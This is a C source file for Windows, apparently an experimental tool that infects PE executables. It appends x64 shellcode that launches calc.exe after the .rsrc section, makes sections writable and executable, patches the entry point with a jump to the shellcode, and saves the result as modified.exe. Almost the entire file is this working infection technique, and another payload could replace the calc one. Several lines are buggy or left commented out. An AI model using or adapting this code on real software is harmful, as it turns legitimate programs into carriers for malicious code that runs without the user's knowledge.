#include<Windows.h>
#include<stdio.h>
#include<string.h>
#include<math.h>

unsigned char calc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

void SETRWX(PBYTE address, DWORD size)
{
	DWORD dwoldprotect = NULL;
	if (!VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &dwoldprotect)) {
		printf("ERROR: %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

LPVOID ResizeSection(HANDLE hfile, LPVOID filedata, DWORD filesize)
{
	PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)filedata;
	PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)(dosheader->e_lfanew + (PBYTE)dosheader);
	PIMAGE_SECTION_HEADER sectionheader = IMAGE_FIRST_SECTION(ntheader);
	WORD numberofsections = ntheader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER rsrcsection = NULL;
	for (int i = 0; i < numberofsections; i++) {
		printf("%s\n", sectionheader->Name);
		if (strcmp(sectionheader->Name, ".rsrc") == 0) {
			rsrcsection = sectionheader;
			printf("Section Header at address: 0x%p\tRVA:0x%0.8X\n", sectionheader->VirtualAddress + (PBYTE)dosheader, sectionheader->VirtualAddress);
		}
		sectionheader = (PBYTE)sectionheader + sizeof(IMAGE_SECTION_HEADER);
	}

	sectionheader = IMAGE_FIRST_SECTION(ntheader);
	DWORD shellcodesize = sizeof(calc);
	printf("Shellcodesize: %d\n", shellcodesize);
	printf("New file size: %d\n", filesize + shellcodesize);
	LPVOID newfiledata = HeapAlloc(GetProcessHeap(), 0, filesize + shellcodesize);

	DWORD tillendrsrcsize = rsrcsection->PointerToRawData + rsrcsection->SizeOfRawData;
	printf("tillendrsrcsize: %d\n", tillendrsrcsize);
	memcpy(newfiledata, filedata, tillendrsrcsize);

	memcpy((PBYTE)newfiledata + tillendrsrcsize, calc, shellcodesize);

	SETRWX((PBYTE)((PBYTE)newfiledata + tillendrsrcsize), shellcodesize);

	PIMAGE_SECTION_HEADER copiedrsrc = ((PBYTE)newfiledata + rsrcsection->PointerToRawData);
	printf("Before datasize: %d\n", copiedrsrc->SizeOfRawData);
	copiedrsrc->SizeOfRawData += shellcodesize;
	printf("After datasize: %d\n", copiedrsrc->SizeOfRawData);

	PIMAGE_SECTION_HEADER currentsection = (PBYTE)rsrcsection +1;
	DWORD sectionOffset = rsrcsection->PointerToRawData + rsrcsection->SizeOfRawData + shellcodesize;
	
	for (int i = (rsrcsection - sectionheader) + 1; i < ntheader->FileHeader.NumberOfSections; i++)
	{
		//PIMAGE_SECTION_HEADER copiedsection = ((PBYTE)newfiledata + ((PBYTE)currentsection - (PBYTE)filedata));
		PIMAGE_SECTION_HEADER copiedsection = (PIMAGE_SECTION_HEADER)((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData);
		//PIMAGE_SECTION_HEADER copiedsection = ((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData);
		memcpy((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData, (PBYTE)filedata + currentsection->PointerToRawData, currentsection->SizeOfRawData);
		
		copiedsection->VirtualAddress+=copiedsection->VirtualAddress+shellcodesize;
		copiedsection->PointerToRawData += shellcodesize;
		copiedsection->Characteristics = 0xE00000E0;
		currentsection = currentsection + sizeof(IMAGE_SECTION_HEADER);
	}

	PIMAGE_DOS_HEADER newdosheader = (PIMAGE_DOS_HEADER)newfiledata;
	PIMAGE_NT_HEADERS newntheader = (PIMAGE_NT_HEADERS)((PBYTE)newdosheader + newdosheader->e_lfanew);
	DWORD align16size = pow(2, shellcodesize / 32 + 1);
	printf("align16size: %d\n", align16size);
	//newntheader->OptionalHeader.AddressOfEntryPoint = rsrcsection->VirtualAddress+align16size;

	sectionheader = IMAGE_FIRST_SECTION(newntheader);
	DWORD entryPoint = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD entryPointOffset = NULL;
	PIMAGE_SECTION_HEADER newrsrcsection = NULL;
	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (entryPoint >= sectionheader->VirtualAddress && entryPoint < sectionheader->VirtualAddress + sectionheader->Misc.VirtualSize) {
			entryPointOffset = sectionheader->PointerToRawData + (entryPoint - sectionheader->VirtualAddress);
			break;
		}
		/*if (strcmp(sectionheader->Name, ".rsrc") == 0) {
			newrsrcsection = sectionheader;
		}*/
		sectionheader++;
	}

	DWORD   jumpAddressWithOffset = tillendrsrcsize;
	printf("JUMP ADDRESS (OFFSET): 0x%0.8X\n", jumpAddressWithOffset);

	/*unsigned char bytes[5];
	bytes[4] = (jumpAddressWithOffset & 0xFF000000) >> 24;
	bytes[3] = (jumpAddressWithOffset & 0x00FF0000) >> 16;
	bytes[2] = (jumpAddressWithOffset & 0x0000FF00) >> 8;
	bytes[1] = jumpAddressWithOffset& 0x000000FF;
	bytes[0] = 0xE9;*/

	DWORD alignRsrcPage = ((rsrcsection->SizeOfRawData / 4096 + 1) - ((float)(rsrcsection->SizeOfRawData)) / 4096) * 4096;
	DWORD shellcodeRVA = rsrcsection->VirtualAddress + rsrcsection->SizeOfRawData+alignRsrcPage;
	printf("alignRsrcPage: %d\n", alignRsrcPage);
	//DWORD shellcodeRVA = newrsrcsection->VirtualAddress + newrsrcsection->SizeOfRawData + align16size;
	DWORD entryPointRVA = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD relativeOffset = shellcodeRVA - (entryPointRVA+5);

	unsigned char bytes[5];
	bytes[0] = 0xE9;  // JMP opcode
	*(DWORD*)(&bytes[1]) = relativeOffset;

	memcpy((PBYTE)newfiledata + entryPointOffset, bytes, sizeof(bytes));
	/*unsigned char bytes[] = { 0xE9, 0xFB, 0xED, 0x19, 0x00 };

	memcpy((PBYTE)newfiledata + entryPointOffset, bytes, sizeof(bytes));
	memcpy((PBYTE)newfiledata + entryPointOffset + sizeof(bytes), jumpAddressWithOffset, sizeof(jumpAddressWithOffset));*/
	
	PIMAGE_SECTION_HEADER newsectionheader = IMAGE_FIRST_SECTION(newntheader);

	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (strcmp(newsectionheader->Name, ".reloc") == 0) {
			/*printf("YESSS");*/
			newsectionheader->Characteristics = 0xE00000E0;
			break;
		}
		//else printf("'%s\n", newsectionheader->Name);
		newsectionheader++;
	}

	SetFilePointer(hfile, 0, NULL, FILE_BEGIN);
	DWORD filebyteswritten = NULL;
	HANDLE newfile = CreateFileA("modified.exe", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(newfile, newfiledata, filesize + shellcodesize, &filebyteswritten, NULL);
	printf("Bytes written to new file: %d", filebyteswritten);
	SetEndOfFile(newfile);
	/*for (int i = numberofsections - 1; i >= 0; i--)
	{
		sectionheader->VirtualAddress += shellcodesize;
		sectionheader->PointerToRawData += shellcodesize;
		sectionheader->Misc.PhysicalAddress += shellcodesize;
	}*/
	return;
}

int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("Enter the name of the PE file you want to parse.\n");
		return -1;
	}

	char filename[MAX_PATH] = { 0 };
	strcpy_s(filename, MAX_PATH, argv[1]);
	printf("%s", filename);

	HANDLE hfile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Failed to open file: %d\n", GetLastError());
		return -1;
	}

	DWORD filesize = GetFileSize(hfile, NULL);
	LPVOID filedata = HeapAlloc(GetProcessHeap(), 0, filesize + sizeof(calc));
	DWORD dwsizeread = NULL;
	if (!ReadFile(hfile, filedata, filesize, &dwsizeread, NULL)) {
		printf("Failed to read file properly\n");
		return -1;
	}
	printf("\tFile Size: %d\tFile Present At: 0x%p\n\n", filesize, filedata);
	ResizeSection(hfile, filedata, filesize);
	return 0;
	/*DWORD importtable_rva = (imageheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	sectionheader = (PIMAGE_SECTION_HEADER)((PBYTE)imageheader + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER importsection = NULL;
	for (int i = 0; i < imageheader->FileHeader.NumberOfSections; i++) {
		if (importtable_rva >= sectionheader->VirtualAddress && importtable_rva < sectionheader->VirtualAddress + sectionheader->Misc.VirtualSize) {
			importsection = sectionheader;
			break;
		}
		sectionheader = (PBYTE)sectionheader + sizeof(IMAGE_SECTION_HEADER);
	}*/

	/*DWORD importoffset = importtable_rva - importsection->VirtualAddress + importsection->PointerToRawData;
	PIMAGE_IMPORT_DESCRIPTOR importtable = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)dosheader + importoffset);
	printf("\n\n####### IMPORT ADDRESS TABLE #######\n");*/

	//while (importtable->Name != 0) {
	//	char* name = (char*)(importtable->Name - importsection->VirtualAddress + importsection->PointerToRawData + (PBYTE)dosheader);
	//	printf("Imported DLL: %s\n", name);
	//	DWORD thunkoffset = importtable->FirstThunk - importsection->VirtualAddress + importsection->PointerToRawData;
	//	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(thunkoffset + (PBYTE)dosheader);
	//	while (thunk->u1.AddressOfData != 0) {
	//		DWORD funcoffset = thunk->u1.AddressOfData - importsection->VirtualAddress + importsection->PointerToRawData;
	//		PIMAGE_IMPORT_BY_NAME funcname = (PIMAGE_IMPORT_BY_NAME)((PBYTE)dosheader + funcoffset);
	//		printf("\t%s\n", funcname->Name);
	//		thunk++;
	//		//thunk = thunk + sizeof(IMAGE_THUNK_DATA);
	//	}
	//	importtable++;
	//	printf("\n");
	//}

	return 0;
}